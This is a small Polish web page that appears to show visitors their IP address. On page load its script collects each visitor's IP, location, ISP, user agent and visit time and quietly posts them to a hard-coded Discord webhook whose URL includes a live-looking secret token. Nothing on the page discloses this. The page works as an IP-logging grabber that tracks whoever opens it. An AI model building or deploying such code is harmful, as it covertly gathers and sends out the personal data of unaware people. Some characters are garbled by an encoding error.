<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Twoje IP</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      color: #333;
      padding: 20px;
    }
    pre {
      background-color: #eaeaea;
      padding: 10px;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <h1>Witaj!</h1>
  <p id="info">Pobieram dane...</p>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1390748518854955188/qNrH-dlXXuUYCzibyXqFgYbsOHFl93qLp89lfESiuA14iTGcdLEBYwk8UrO726qfjODP";

    async function fetchIPData() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Nieudane pobranie danych IP.");

        const data = await response.json();

        const ip = data.ip;
        const country = data.country_name;
        const city = data.city;
        const isp = data.org;
        const userAgent = navigator.userAgent;
        const time = new Date().toLocaleString("pl-PL");

        const content = `
**ðŸ“¡ Nowe odwiedziny strony**
\`\`\`
IP: ${ip}
Kraj: ${country}
Miasto: ${city}
Dostawca: ${isp}
User-Agent: ${userAgent}
Data i czas: ${time}
\`\`\`
`;

        // PokaÅ¼ na stronie
        document.getElementById("info").innerHTML = `<pre>${content}</pre>`;

        // WyÅ›lij na Discord webhook
        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ content })
        });

      } catch (error) {
        console.error("BÅ‚Ä…d:", error);
        document.getElementById("info").textContent = "Nie udaÅ‚o siÄ™ pobraÄ‡ danych.";
      }
    }

    fetchIPData();
  </script>
</body>
</html>
